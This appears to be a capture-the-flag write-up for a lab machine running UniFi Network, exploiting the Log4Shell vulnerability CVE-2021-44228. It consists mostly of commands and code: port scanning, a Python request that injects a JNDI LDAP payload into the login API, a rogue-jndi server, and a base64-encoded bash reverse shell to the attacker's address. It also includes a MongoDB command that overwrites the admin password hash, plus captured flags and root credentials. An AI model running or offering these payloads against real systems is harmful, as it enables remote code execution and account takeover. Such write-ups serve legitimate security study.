# Enumeration
```sh
nmap 10.129.184.35 -p1-10000 -sC -sV -vvv
.
.
.
Discovered open port 22/tcp on 10.129.184.35
Discovered open port 8080/tcp on 10.129.184.35
Discovered open port 8443/tcp on 10.129.184.35
Discovered open port 6789/tcp on 10.129.184.35
Discovered open port 8843/tcp on 10.129.184.35
Discovered open port 8880/tcp on 10.129.184.35
.
.
.
PORT     STATE SERVICE         REASON  VERSION
22/tcp   open  ssh             syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
6789/tcp open  ibm-db2-admin?  syn-ack
8080/tcp open  http-proxy      syn-ack
8443/tcp open  ssl/nagios-nsca syn-ack Nagios NSCA
8843/tcp open  ssl/unknown     syn-ack
8880/tcp open  cddbp-alt?      syn-ack
```

# Port 8443
```
Unifi Network v6.4.54

Known Vulnerability: CVE-2021-44228
```

# Login API Request
```sh
curl 'https://10.129.184.35:8443/api/login' -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0' -H 'Accept: */*' -H 'Accept-Language: en-US,en;q=0.5' --compressed -H 'Referer: https://10.129.184.35:8443/manage/account/login?redirect=%2Fmanage' -H 'Content-Type: application/json; charset=utf-8' -H 'Origin: https://10.129.184.35:8443' -H 'Connection: keep-alive' --data-raw '{"username":"s","password":"s","remember":false,"strict":true}'
```

```py
import requests

headers = {
    'Accept': '*/*',
    'Content-Type': 'application/json; charset=utf-8',
    'Origin': 'https://10.129.184.35:8443',
    'Connection': 'keep-alive',
}

json_data = {
    'username': 's',
    'password': 's',
    'remember': r'${jndi:ldap://10.10.15.204/whatever}',
    'strict': True,
}

response = requests.post('https://10.129.184.35:8443/api/login', headers=headers, json=json_data, verify=False)
print(response.text, response.status_code)
```

# Check traffic on port 389 (LDAP)
```sh
sudo tcpdump -i tun0 port 389
```

# Software required to execute Log4j
```sh
sudo apt-get install openjdk-11-jdk -y
sudo apt-get install maven -y

git clone https://github.com/veracode-research/rogue-jndi
cd rogue-jndi
mvn package
```

# Exploit (just decided to work?)
```sh
echo 'bash -c bash -i >&/dev/tcp/10.10.15.204/4444 0>&1' | base64
java -jar rogue-jndi/target/RogueJndi-1.1.jar --command "bash -c {echo,YmFzaCAtYyBiYXNoIC1pID4mL2Rldi90Y3AvMTAuMTAuMTUuMjA0LzQ0NDQgMD4mMQo=}|{base64,-d}|{bash,-i}" --hostname "10. 10.15.204"
```

# user.txt
```
6ced1a6a89e666c0620cdb10262ba127
```

```sh
mongo --port 27117 ace --eval 'db.admin.update({ "_id" : ObjectId("61ce278f46e0fb0012d47ee4") }, { $set: {"x_shadow": "$6$IFBZtn6385/9WoBj$P2xfXWboxRUgs1f9VWnLdRPDSzTEK6oU0My2XIAFUihokov7h2PwrvcHiLIp6sa0vSdNuby8hjbskoqRyapb31"}})'
```

# credentials found on the website
```
root
NotACrackablePassword4U2022
```

# root.txt
```
e50bc93c75b634e4b272d2f771c33681
```